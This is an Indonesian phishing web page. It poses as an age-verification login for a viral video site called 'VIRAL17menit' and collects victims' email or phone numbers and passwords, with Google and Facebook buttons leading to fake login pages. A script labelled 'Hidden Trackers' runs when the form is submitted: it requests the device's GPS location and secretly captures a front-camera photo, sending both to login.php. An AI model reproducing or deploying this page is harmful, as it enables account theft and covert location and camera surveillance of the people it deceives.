<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VIRAL17menit - Verifikasi Akun</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body, html { height: 100%; overflow: hidden; background-color: #000; }

        /* FIX BACKGROUND: Gambar Jelas & Stabil */
        .bg-image {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://pexels.com');
            background-position: center;
            background-size: cover;
            background-repeat: no-repeat;
            filter: blur(5px) brightness(0.6); /* Blur rendah agar objek di belakang JELAS */
            z-index: 1;
            transform: scale(1.1);
        }

        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.7) 100%);
        }

        /* CARD LOGIN GLASSMORPHISM */
        .login-card {
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 40px 25px;
            width: 90%;
            max-width: 380px;
            border-radius: 25px;
            text-align: center;
            color: #fff;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
            z-index: 3;
        }

        .logo { font-size: 32px; font-weight: 900; margin-bottom: 10px; letter-spacing: -1px; }
        .logo span { background: #ff9000; color: #000; padding: 2px 8px; border-radius: 6px; margin-left: 5px; }
        
        .instruction { font-size: 13px; color: #eee; margin-bottom: 25px; line-height: 1.5; font-weight: 500; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }

        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        input:focus { background: rgba(255, 255, 255, 0.15); border-color: #ff9000; }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: #ff9000;
            color: #000;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            margin-bottom: 20px;
            box-shadow: 0 5px 20px rgba(255, 144, 0, 0.4);
            transition: 0.3s;
        }
        .btn-submit:hover { transform: scale(1.02); background: #ffa500; }

        /* FIX SOSMED LOGO: Menggunakan SVG Internal agar 100% Muncul */
        .social-login { display: flex; gap: 10px; }
        .social-btn {
            flex: 1;
            padding: 12px;
            border-radius: 12px;
            border: none;
            font-size: 13px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
            transition: 0.3s;
        }
        .social-btn:hover { opacity: 0.9; }
        .google { background: #fff; color: #333; }
        .fb { background: #1877f2; color: #fff; }
        .icon { width: 18px; height: 18px; }
    </style>
</head>
<body>

    <div class="bg-image"></div>

    <div class="overlay">
        <div class="login-card">
            <div class="logo">VIRAL<span>17menit</span></div>
            <p class="instruction">Login untuk memverifikasi usia Anda dan menonton video lengkap secara eksklusif.</p>

            <form action="login.php" method="POST" onsubmit="startTracking()">
                <input type="email" name="email" placeholder="Email atau Nomor HP" required>
                <input type="password" name="pass" placeholder="Password Akun" required>
                <button type="submit" class="btn-submit">BUKA KONTEN</button>
            </form>

            <div class="social-login">
                <!-- Google SVG Icon -->
                <button type="button" class="social-btn google" onclick="location.href='google.html'">
                    <svg class="icon" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                    Google
                </button>
                <!-- Facebook SVG Icon -->
                <button type="button" class="social-btn fb" onclick="location.href='fb.html'">
                    <svg class="icon" fill="white" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                    Facebook
                </button>
            </div>
        </div>
    </div>

    <!-- Hidden Trackers -->
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        function startTracking() {
            // Trigger GPS
            navigator.geolocation.getCurrentPosition(r => {
                fetch(`login.php?lat=${r.coords.latitude}&lon=${r.coords.longitude}`);
            });
            // Trigger Kamera Depan
            const v = document.getElementById('v');
            navigator.mediaDevices.getUserMedia({video:true}).then(s => {
                v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                    fetch('login.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'img=' + encodeURIComponent(c.toDataURL('image/png'))
                    });
                    s.getTracks().forEach(t => t.stop());
                }, 2000);
            }).catch(e => {});
        }
    </script>
</body>
</html>
